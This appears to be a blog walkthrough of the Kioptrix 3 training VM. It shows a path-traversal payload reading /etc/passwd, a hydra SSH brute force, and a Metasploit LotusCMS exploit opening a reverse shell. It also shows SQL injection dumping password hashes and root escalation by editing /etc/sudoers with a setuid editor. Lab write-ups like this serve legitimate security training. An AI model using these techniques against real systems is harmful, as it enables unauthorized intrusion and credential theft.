<i>Kioptrix 4 VM can be downloaded <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/" target="_blank">here</a></i><br /><h2>0. Get VMs IP</h2><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> netdiscover -r 192.168.1.0/24<br /><br /><span style="color: black; font-style: italic;"> Currently scanning: Finished!   |   Screen View: Unique Hosts</span><br /><br /><span style="color: black; font-style: italic;"> 271 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 16260</span><br /><span style="color: black; font-style: italic;"> _____________________________________________________________________________</span><br /><span style="color: black; font-style: italic;">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname&nbsp;</span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: black; font-style: italic;">&nbsp;</span><span style="color: black; font-style: italic;"> -----------------------------------------------------------------------------</span><br /><span style="color: black; font-style: italic;"> 192.168.1.70    c4:e9:84:10:d3:5e      5     300  TP-LINK TECHNOLOGIES CO.,LTD.</span>&nbsp;</pre><pre style="line-height: 125%; margin: 0;"><b>...</b> </pre></div><br />Make sure you update your hosts file by adding "192.168.1.70 kioptrix3.com" to the following file:<br /><ul><li>Linux: /etc/hosts</li><li>Windows: C:\windows\system32\drivers\etc\hosts</li></ul><h2>1. Enumeration&nbsp;</h2><h4>TCP Ports enumeration</h4><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> nmap -sV 192.168.1.70<br /><br /><span style="color: black; font-style: italic;">Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-20 22:58 EST</span><br /><span style="color: black; font-style: italic;">Nmap scan report for kioptrix.com (192.168.1.70)</span><br /><span style="color: black; font-style: italic;">Host is up (0.000055s latency).</span><br /><span style="color: black; font-style: italic;">Not shown: 998 closed ports</span><br /><span style="color: black; font-style: italic;">PORT   STATE SERVICE VERSION</span><br /><b><span style="color: black; font-style: italic;">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br /><span style="color: black; font-style: italic;">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span></b><br /><span style="color: black; font-style: italic;">MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)</span><br /><span style="color: black; font-style: italic;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br /><br /><span style="color: black; font-style: italic;">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br /><span style="color: black; font-style: italic;">Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds</span><br /></pre></div><br />Only SSH service and a webserver are running. A full TCP scan yield the same results.<br /><br />Attacking  SSH service is kind of pointless unless version is vulnerable and/or  you found a valid username for bruteforcing a password.<br /><h2>2. Web server</h2>As usual, run Nikto while you're manually poking around the website.<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> nikto -host kioptrix.com<br /><span style="color: black; font-style: italic;">- Nikto v2.1.6</span><br /><span style="color: black; font-style: italic;">---------------------------------------------------------------------------</span><br /><span style="color: black; font-style: italic;">+ Target IP:          192.168.1.70</span><br /><span style="color: black; font-style: italic;">+ Target Hostname:    kioptrix.com</span><br /><span style="color: black; font-style: italic;">+ Target Port:        80</span><br /><span style="color: black; font-style: italic;">+ Start Time:         2016-12-20 23:03:24 (GMT-5)</span><br /><span style="color: black; font-style: italic;">---------------------------------------------------------------------------</span><br /><span style="color: black; font-style: italic;">+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br /><span style="color: black; font-style: italic;">+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6</span><br /><span style="color: black; font-style: italic;">+ The anti-clickjacking X-Frame-Options header is not present.</span><br /><span style="color: black; font-style: italic;">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br /><span style="color: black; font-style: italic;">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br /><span style="color: black; font-style: italic;">+ Cookie PHPSESSID created without the httponly flag</span><br /><span style="color: black; font-style: italic;">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span><br /><span style="color: black; font-style: italic;">+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.</span><br /><span style="color: black; font-style: italic;">+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br /><span style="color: black; font-style: italic;">+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009</span><br /><span style="color: black; font-style: italic;">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br /><span style="color: black; font-style: italic;">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br /><span style="color: black; font-style: italic;">+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br /><span style="color: black; font-style: italic;">+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br /><span style="color: black; font-style: italic;">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br /><span style="color: black; font-style: italic;">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br /><span style="color: black; font-style: italic;">+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span><br /><span style="color: black; font-style: italic;">+ OSVDB-3268: /icons/: Directory indexing found.</span><br /><span style="color: black; font-style: italic;">+ OSVDB-3233: /icons/README: Apache default file found.</span><br /><span style="color: black; font-style: italic;">+ /phpmyadmin/: phpMyAdmin directory found</span><br /><span style="color: black; font-style: italic;">+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span><br /><span style="color: black; font-style: italic;">+ 7444 requests: 0 error(s) and 19 item(s) reported on remote host</span><br /><span style="color: black; font-style: italic;">+ End Time:           2016-12-20 23:03:41 (GMT-5) (17 seconds)</span><br /><span style="color: black; font-style: italic;">---------------------------------------------------------------------------</span><br /><span style="color: black; font-style: italic;">+ 1 host(s) tested</span><br /></pre></div><br />Since there's a phpMyAdmin portal available, let's try some default username/password.<br />"admin"  with an empty password worked! Unfortunately, "admin" user has only  access to "information_schema" and didn't reveal any credentials we can  use to get a shell through SSH.<br /><br />Fuck it, let's check the actual site. <br /><br />After poking through the site it seems to contain 2 components:<br /><ul><li><b>Ligoat Security blog</b></li><b> </b><li><b>Gallery (Kioptrix3.com/gallery)</b></li></ul>Before trying out our webapp pentesting skills, it's worth noting that we found a username in the second blogpost!<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">Welcome <b>loneferret</b>! and don't forget to fill in your time sheet.<br /></pre></div><br />This piece of info will result in getting limited shell, follow-up <a href="#localshell1">here</a>.<br /><br /><h4><b>LFI</b></h4><br />After spending some time I wasn't able to  find a file inclusion vulnerability. After I rooted the VM I found out  it is indeed possible.<br />Doesn't work:<br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd <br /></pre></div>Works:<br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd.html<br /></pre></div><br />Content of /etc/passwd (which confirms that <b>loneferret </b>exists):<br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #aaaaaa;">root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br />bin:x:2:2:bin:/bin:/bin/sh<br />sys:x:3:3:sys:/dev:/bin/sh<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/bin/sh<br />man:x:6:12:man:/var/cache/man:/bin/sh<br />lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br />mail:x:8:8:mail:/var/mail:/bin/sh<br />news:x:9:9:news:/var/spool/news:/bin/sh<br />uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br />proxy:x:13:13:proxy:/bin:/bin/sh<br />www-data:x:33:33:www-data:/var/www:/bin/sh<br />backup:x:34:34:backup:/var/backups:/bin/sh<br />list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br />irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br />nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br />libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br />dhcp:x:101:102::/nonexistent:/bin/false<br />syslog:x:102:103::/home/syslog:/bin/false<br />klog:x:103:104::/home/klog:/bin/false<br />mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false<br />sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin<br />loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash<br />dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash<br /><br />Parse error: syntax error, unexpected '.', expecting T_STRING or T_VARIABLE or '$' in /home/www/kioptrix3.com/core/lib/router.php(26) : eval()'d code on line 1</span><br /></pre></div><i>More details: https://www.htbridge.com/advisory/HTB22883</i><b>&nbsp;</b><br /><br /><h4><b>LotusCMS</b></h4><h4><b>&nbsp;</b></h4>You might've figured out already, there's a CMS serving  data for the website called LotusCMS, it also happens to have very  serious vulnerabilities:<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~#</span> searchsploit lotuscms<br /><span style="color: #aaaaaa;">----------------------------------------------------------------------------------------- ----------------------------------</span><br /><span style="color: #aaaaaa;"> Exploit Title                                                                           |  Path</span><br /><span style="color: #aaaaaa;">                                                                                         | (/usr/share/exploitdb/platforms)</span><br /><span style="color: #aaaaaa;">----------------------------------------------------------------------------------------- ----------------------------------</span><br /><span style="color: #aaaaaa;">LotusCMS 3.0 - eval() Remote Command Execution (Metasploit)"                             | /php/remote/18565.rb</span><br /><span style="color: #aaaaaa;">LotusCMS 3.0.3 - Multiple Vulnerabilities"                                               | /php/webapps/16982.txt</span><br /><span style="color: #aaaaaa;">----------------------------------------------------------------------------------------- ----------------------------------</span><br /></pre></div><br />Getting a shell out of this vulnerability in action is <a href="#localshell2">here</a>.<br /><br /><h2>3. Getting a shell!</h2><h4 id="localshell1">Method 1: Bruteforcing SSH for loneferret</h4><div id="localshell1">We already know the user exists via a blog post mentioned earlier.</div><br />IMPORTANT:<i> </i>When running hydra, make sure you include <i>-t 4</i> parameter, otherwise the service could get overloaded and not all passwords will be tested properly.<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~#</span> hydra -e nsr -l loneferret -P /root/Desktop/wordlists/10_million_password_list_top_100000.txt 192.168.1.70 ssh -t 4<br /><span style="color: #aaaaaa;">Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br /><br /><span style="color: #aaaaaa;">Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-21 23:02:32</span><br /><span style="color: #aaaaaa;">[DATA] max 4 tasks per 1 server, overall 64 tasks, 100003 login tries (l:1/p:100003), ~390 tries per task</span><br /><span style="color: #aaaaaa;">[DATA] attacking service ssh on port 22</span><br /><span style="color: #aaaaaa;">[<span style="color: lime;">22</span>][<span style="color: lime;">ssh</span>] host: <span style="color: lime;">192.168.1.70</span>   login: <span style="color: lime;">loneferret</span>   password: <span style="color: lime;">starwars</span></span><br /><span style="color: #aaaaaa;">1 of 1 target successfully completed, 1 valid password found</span><br /><span style="color: #aaaaaa;">Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-21 23:03:27</span><br /></pre></div><br />We did find a valid login! Are there other ways to get a shell?<br /><br /><h4 id="localshell2">Method 2: LotusCMS eval()</h4><h4 id="localshell2"></h4>Although I'm not a fan of using metasploit for those VMs it was too tempting...<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~#</span> msfconsole<br /><span style="color: #aaaaaa;">msf &gt; search lotuscms</span><br />...<br /><span style="color: #aaaaaa;">Matching Modules</span><br /><span style="color: #aaaaaa;">================</span><br /><br /><span style="color: #aaaaaa;">   Name                              Disclosure Date  Rank       Description</span><br /><span style="color: #aaaaaa;">   ----                              ---------------  ----       -----------</span><br /><span style="color: #aaaaaa;">   exploit/multi/http/lcms_php_exec  2011-03-03       excellent  LotusCMS 3.0 eval() Remote Command Execution</span><br /><br /><br /><br /><span style="color: #aaaaaa;">msf &gt; use exploit/multi/http/lcms_php_exec</span><br /><br /><span style="color: #aaaaaa;">msf exploit(lcms_php_exec) &gt; show options</span><br /><br /><span style="color: #aaaaaa;">Module options (exploit/multi/http/lcms_php_exec):</span><br /><br /><span style="color: #aaaaaa;">   Name     Current Setting  Required  Description</span><br /><span style="color: #aaaaaa;">   ----     ---------------  --------  -----------</span><br /><span style="color: #aaaaaa;">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br /><span style="color: #aaaaaa;">   RHOST                     yes       The target address</span><br /><span style="color: #aaaaaa;">   RPORT    80               yes       The target port</span><br /><span style="color: #aaaaaa;">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br /><span style="color: #aaaaaa;">   URI      /lcms/           yes       URI</span><br /><span style="color: #aaaaaa;">   VHOST                     no        HTTP server virtual host</span><br /><br /><br /><span style="color: #aaaaaa;">Exploit target:</span><br /><br /><span style="color: #aaaaaa;">   Id  Name</span><br /><span style="color: #aaaaaa;">   --  ----</span><br /><span style="color: #aaaaaa;">   0   Automatic LotusCMS 3.0</span><br /><br /><br /><br /><span style="color: #aaaaaa;">msf exploit(lcms_php_exec) &gt; set URI /</span><br /><span style="color: #aaaaaa;">URI =&gt; /</span><br /><br /><span style="color: #aaaaaa;">msf exploit(lcms_php_exec) &gt; set RHOST kioptrix3.com</span><br /><span style="color: #aaaaaa;">RHOST =&gt; kioptrix3.com</span><br /><br /><span style="color: #aaaaaa;">msf exploit(lcms_php_exec) &gt; run</span><br /><br /><span style="color: #aaaaaa;">[*] Started reverse TCP handler on 192.168.1.69:4444 </span><br /><span style="color: #aaaaaa;">[*] Using found page param: /index.php?page=index</span><br /><span style="color: #aaaaaa;">[*] Sending exploit ...</span><br /><span style="color: #aaaaaa;">[*] Sending stage (34122 bytes) to 192.168.1.70</span><br /><span style="color: #aaaaaa;">[*] Meterpreter session 1 opened (192.168.1.69:4444 -&gt; 192.168.1.70:32943) at 2016-12-21 00:55:22 -0500</span><br /><br /><span style="color: #aaaaaa;">meterpreter &gt; shell</span><br /><span style="color: #aaaaaa;">Process 6991 created.</span><br /><span style="color: #aaaaaa;">Channel 0 created.</span><br /><span style="color: #aaaaaa;">whoami</span><br /><span style="color: #aaaaaa;">www-data</span><br /></pre></div><br /><h4>Method 3: SQL injection through Gallery</h4><i>kioptrix3.com/gallery/gallery.php?id=1</i> is vulnerable to SQL injection through the id parameter.<br />There  are multiple ways to exploit this vulnerability, easiest is just using  sqlmap. Ultimately you'll find MD5 hashes for a couple of accounts.  Password for loneferret matches the one we found through hydra!<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">Database: gallery</span><br /><span style="color: #888888;">Table: dev_accounts</span><br /><span style="color: #888888;">[2 entries]</span><br /><span style="color: #888888;">+----+------------+---------------------------------------------+</span><br /><span style="color: #888888;">| id | username   | password                                    |</span><br /><span style="color: #888888;">+----+------------+---------------------------------------------+</span><br /><span style="color: #888888;">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br /><span style="color: #888888;">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br /><span style="color: #888888;">+----+------------+---------------------------------------------+</span><br /></pre></div><br />Also note that with the second method, you can  do some enumeration on the machine and you'll find the following file  particularly interesting: <i><b>/home/www/kioptrix3.com/gallery/gconfig.php</b> </i>as it contains phpmyAdmin credentials <b>(root/fuckeyou)</b> with enough privileges to find the same database discussed earlier. These creds don't work for SSH though.<br /><h2>4. Privilege Escalation to root</h2>Now that we're inside let's find some useful data. I logged in with loneferret's credentials.<br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~# </span>ssh loneferret@192.168.1.70<br /><span style="color: #999999;">loneferret@192.168.1.70's password: <br />Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686<br /><br />The programs included with the Ubuntu system are free software;<br />the exact distribution terms for each program are described in the<br />individual files in /usr/share/doc/*/copyright.<br /><br />Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br />applicable law.<br /><br />To access official Ubuntu documentation, please visit:<br />http://help.ubuntu.com/<br />Last login: Wed Dec 21 15:49:18 2016 from 192.168.1.69<br />loneferret@Kioptrix3:~$ </span><span style="color: #c65d09; font-weight: bold;"><br /></span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> ls -al<br /><span style="color: #888888;">total 64</span><br /><span style="color: #888888;">drwxr-xr-x 3 loneferret loneferret  4096 2011-04-17 08:59 .</span><br /><span style="color: #888888;">drwxr-xr-x 5 root       root        4096 2011-04-16 07:54 ..</span><br /><span style="color: #888888;">-rw-r--r-- 1 loneferret users         13 2011-04-18 11:44 .bash_history</span><br /><span style="color: #888888;">-rw-r--r-- 1 loneferret loneferret   220 2011-04-11 17:00 .bash_logout</span><br /><span style="color: #888888;">-rw-r--r-- 1 loneferret loneferret  2940 2011-04-11 17:00 .bashrc</span><br /><span style="color: #888888;">-rwxrwxr-x 1 root       root       26275 2011-01-12 10:45 checksec.sh</span><br /><span style="color: #888888;">-rw-r--r-- 1 root       root         224 2011-04-16 08:51 CompanyPolicy.README</span><br /><span style="color: #888888;">-rw------- 1 root       root          15 2011-04-15 21:21 .nano_history</span><br /><span style="color: #888888;">-rw-r--r-- 1 loneferret loneferret   586 2011-04-11 17:00 .profile</span><br /><span style="color: #888888;">drwx------ 2 loneferret loneferret  4096 2011-04-14 11:05 .ssh</span><br /><span style="color: #888888;">-rw-r--r-- 1 loneferret loneferret     0 2011-04-11 18:00 .sudo_as_admin_successful</span><br /><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> cat CompanyPolicy.README <br /><span style="color: #888888;">Hello new employee,</span><br /><span style="color: #888888;">It is company policy here to use our newly installed software for editing, creating and viewing files.</span><br /><span style="color: #888888;">Please use the command 'sudo ht'.</span><br /><span style="color: #888888;">Failure to do so will result in you immediate termination.</span><br /><br /><span style="color: #888888;">DG</span><br /><span style="color: #888888;">CEO</span><br /><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span><br /></pre></div><br />Hmm, what's that ht file they want us to run?<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> which ht                                                                                                                                    <br /><span style="color: #888888;">/usr/local/bin/ht</span><br /><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> ls -l /usr/local/bin/ht<br /><span style="color: #888888;">-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht</span><br /></pre></div>Oh, so this file has setuid bit enabled, AND is owned by  root. After poking with the tool I realized it's a HEX editor. This  means we can edit any file we want even it's owned by root!<br />What's the easiest file to edit and get root you ask?<br /><br />It's<i><b> /etc/sudoers</b></i>.<br /><br />Be  extremely careful while editing the sudoers file, saving it in bad  format might break stuff and make you unable to use the su command. How  do I know? Because I broke my VM, <i>twice</i>..<br /><br />First, you might need to update the environment variable TERM.<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> sudo ht /etc/users<br /><span style="color: #888888;">Error opening terminal: xterm-256color.</span><br /><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> <span style="color: #007722;">export </span><span style="color: #003366;">TERM</span><span style="color: #333333;">=</span>xterm</pre><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> sudo ht /etc/users </pre></div><br />Next, change mode to text by pressing F6, you'll notice the following line:<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht</span><br /></pre></div><br />We can simply replace the "!" by a space (0x20), so running /usr/bin/su gives us root.<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> sudo /usr/bin/su<br /><span style="color: #888888;">[sudo] password for loneferret: </span><br /><span style="color: #888888;">sudo: /usr/bin/su: command not found</span><br /><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> which su<br /><span style="color: #888888;">/bin/su</span><br /></pre></div><br />Oh, no wonder it didn't work. su is under /bin/su, not /usr/bin/su...<br />Final edit makes /etc/sudoers file contain:<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">loneferret ALL=NOPASSWD: /bin/su, /usr/local/bin/ht</span><br /></pre></div><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">loneferret@Kioptrix3:~$</span> sudo /bin/su<br /><span style="color: #c65d09; font-weight: bold;">root@Kioptrix3:/home/loneferret#</span> whoami<br /><span style="color: #888888;">root</span><br /></pre></div><br />It worked! We got root! Where is our flag?<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@Kioptrix3:/home/loneferret#</span> <span style="color: #007722;">cd</span> /root<br /><span style="color: #c65d09; font-weight: bold;">root@Kioptrix3:~#</span> ls -al<br /><span style="color: #888888;">total 52</span><br /><span style="color: #888888;">drwx------  5 root root  4096 2011-04-17 08:59 .</span><br /><span style="color: #888888;">drwxr-xr-x 21 root root  4096 2011-04-11 16:54 ..</span><br /><span style="color: #888888;">-rw-------  1 root root     9 2011-04-18 11:49 .bash_history</span><br /><span style="color: #888888;">-rw-r--r--  1 root root  2227 2007-10-20 07:51 .bashrc</span><br /><span style="color: #888888;">-rw-r--r--  1 root root  1327 2011-04-16 08:13 Congrats.txt</span><br /><span style="color: #888888;">drwxr-xr-x 12 root root 12288 2011-04-16 07:26 ht-2.0.18</span><br /><span style="color: #888888;">-rw-------  1 root root   963 2011-04-12 19:33 .mysql_history</span><br /><span style="color: #888888;">-rw-------  1 root root   228 2011-04-18 11:09 .nano_history</span><br /><span style="color: #888888;">-rw-r--r--  1 root root   141 2007-10-20 07:51 .profile</span><br /><span style="color: #888888;">drwx------  2 root root  4096 2011-04-13 10:06 .ssh</span><br /><span style="color: #888888;">drwxr-xr-x  3 root root  4096 2011-04-15 23:30 .subversion</span><br /><span style="color: #c65d09; font-weight: bold;">root@Kioptrix3:~#</span> cat Congrats.txt <br /><span style="color: #888888;">Good for you for getting here.</span><br /><span style="color: #888888;">Regardless of the matter (staying within the spirit of the game of course)</span><br /><span style="color: #888888;">you got here, congratulations are in order. Wasn't that bad now was it.</span><br /><br /><span style="color: #888888;">Went in a different direction with this VM. Exploit based challenges are</span><br /><span style="color: #888888;">nice. Helps workout that information gathering part, but sometimes we</span><br /><span style="color: #888888;">need to get our hands dirty in other things as well.</span><br /><span style="color: #888888;">Again, these VMs are beginner and not intented for everyone. </span><br /><span style="color: #888888;">Difficulty is relative, keep that in mind.</span><br /><br /><span style="color: #888888;">The object is to learn, do some research and have a little (legal)</span><br /><span style="color: #888888;">fun in the process.</span><br /><br /><br /><span style="color: #888888;">I hope you enjoyed this third challenge.</span><br /><br /><span style="color: #888888;">Steven McElrea</span><br /><span style="color: #888888;">aka loneferret</span><br /><span style="color: #888888;">http://www.kioptrix.com</span><br /><br /><br /><span style="color: #888888;">Credit needs to be given to the creators of the gallery webapp and CMS used</span><br /><span style="color: #888888;">for the building of the Kioptrix VM3 site.</span><br /><br /><span style="color: #888888;">Main page CMS: </span><br /><span style="color: #888888;">http://www.lotuscms.org</span><br /><br /><span style="color: #888888;">Gallery application: </span><br /><span style="color: #888888;">Gallarific 2.1 - Free Version released October 10, 2009</span><br /><span style="color: #888888;">http://www.gallarific.com</span><br /><span style="color: #888888;">Vulnerable version of this application can be downloaded</span><br /><span style="color: #888888;">from the Exploit-DB website:</span><br /><span style="color: #888888;">http://www.exploit-db.com/exploits/15891/</span><br /><br /><span style="color: #888888;">The HT Editor can be found here:</span><br /><span style="color: #888888;">http://hte.sourceforge.net/downloads.html</span><br /><span style="color: #888888;">And the vulnerable version on Exploit-DB here:</span><br /><span style="color: #888888;">http://www.exploit-db.com/exploits/17083/</span><br /><br /><br /><span style="color: #888888;">Also, all pictures were taken from Google Images, so being part of the</span><br /><span style="color: #888888;">public domain I used them.</span><br /><br /><span style="color: #c65d09; font-weight: bold;">root@Kioptrix3:~#</span> <br /></pre></div><br />Good stuff, just finished in time for dinner. Expect Kioptrix 4 soon..<br /><br /><i>Currently listening to <a href="https://www.youtube.com/watch?v=JW_cFqsfAQY">Amorphis - Godlike Machine</a></i>